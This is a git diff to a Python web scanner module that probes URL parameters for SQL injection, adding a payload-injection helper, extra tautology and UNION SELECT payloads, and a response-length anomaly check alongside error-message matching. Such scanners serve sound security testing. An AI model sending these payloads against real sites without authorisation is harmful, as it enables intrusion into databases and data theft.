@@ -1,5 +1,6 @@
 import requests
 import urllib3
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from modules.colors import Colors
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -8,6 +9,26 @@ headers = {
     "User-Agent": "Mozilla/5.0"
 }
 
+def inject_payload(url, param, payload):
+    parsed = urlparse(url)
+    query = parse_qs(parsed.query)
+
+    query[param] = payload
+
+    new_query = urlencode(query, doseq=True)
+
+    new_url = urlunparse((
+        parsed.scheme,
+        parsed.netloc,
+        parsed.path,
+        parsed.params,
+        new_query,
+        parsed.fragment
+    ))
+
+    return new_url
+
+
 def detect_sql_injection(url, report):
 
     print(f"\n{Colors.BLUE}[+] Testing for SQL Injection...{Colors.RESET}\n")
@@ -15,16 +36,22 @@ def detect_sql_injection(url, report):
     report.write("SQL Injection Test\n")
     report.write("------------------\n")
 
-    # SQL payloads
+    # Extended SQL payloads (more realistic)
     payloads = [
         "' OR '1'='1",
         "' OR 1=1--",
         "\" OR \"1\"=\"1",
         "' OR 'a'='a",
-        "' OR 1=1#"
+        "' OR 1=1#",
+        "' OR 1=1/*",
+        "' OR '1'='1'-- -",
+        "' OR ''='",
+        "' OR 1=1 LIMIT 1--",
+        "' UNION SELECT NULL--",
+        "' UNION SELECT NULL,NULL--"
     ]
 
-    # Common SQL error messages
+    # SQL error patterns
     errors = [
         "sql syntax",
         "mysql",
@@ -42,36 +69,49 @@ def detect_sql_injection(url, report):
     ]
 
     try:
+        # Baseline request (important improvement)
+        baseline = requests.get(url, headers=headers, timeout=15, verify=False)
+        baseline_length = len(baseline.text)
 
-        # Check if URL already contains parameters
-        if "?" in url:
-            base_url = url.split("=")[0] + "="
-        else:
-            base_url = url + "?id="
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
 
-        for payload in payloads:
+        # If no parameters → test default param
+        if not params:
+            params = {"id": ["1"]}
 
-            test_url = base_url + payload
+        for param in params:
 
-            print(f"{Colors.YELLOW}[TESTING]{Colors.RESET} {test_url}")
+            print(f"{Colors.CYAN}[INFO]{Colors.RESET} Testing parameter: {param}")
 
-            response = requests.get(test_url, headers=headers, timeout=15, verify=False)
+            for payload in payloads:
 
-            content = response.text.lower()
+                test_url = inject_payload(url, param, payload)
 
-            for error in errors:
+                print(f"{Colors.YELLOW}[TESTING]{Colors.RESET} {test_url}")
 
-                if error in content:
+                response = requests.get(test_url, headers=headers, timeout=15, verify=False)
+                content = response.text.lower()
 
-                    print(f"{Colors.RED}[HIGH]{Colors.RESET} Possible SQL Injection detected")
-                    print(f"{Colors.CYAN}Payload used: {payload}{Colors.RESET}")
+                # 🔴 1. Error-based detection
+                for error in errors:
+                    if error in content:
+                        print(f"{Colors.RED}[HIGH]{Colors.RESET} SQL Injection (Error-Based)")
+                        print(f"{Colors.CYAN}Payload: {payload}{Colors.RESET}")
 
-                    report.write("HIGH: Possible SQL Injection detected\n")
-                    report.write(f"Payload used: {payload}\n")
-                    report.write("Detection Mechanism:\n")
-                    report.write("- SQL payload injected\n")
-                    report.write("- Database error detected\n\n")
+                        report.write("HIGH: SQL Injection (Error-Based)\n")
+                        report.write(f"Parameter: {param}\n")
+                        report.write(f"Payload: {payload}\n\n")
+                        return
 
+                # 🟡 2. Response length anomaly detection
+                if abs(len(response.text) - baseline_length) > 50:
+                    print(f"{Colors.RED}[MEDIUM]{Colors.RESET} Possible SQL Injection (Content Change)")
+                    print(f"{Colors.CYAN}Payload: {payload}{Colors.RESET}")
+
+                    report.write("MEDIUM: Possible SQL Injection (Content Change)\n")
+                    report.write(f"Parameter: {param}\n")
+                    report.write(f"Payload: {payload}\n\n")
                     return
 
         print(f"{Colors.GREEN}[INFO]{Colors.RESET} No SQL Injection indicators found")
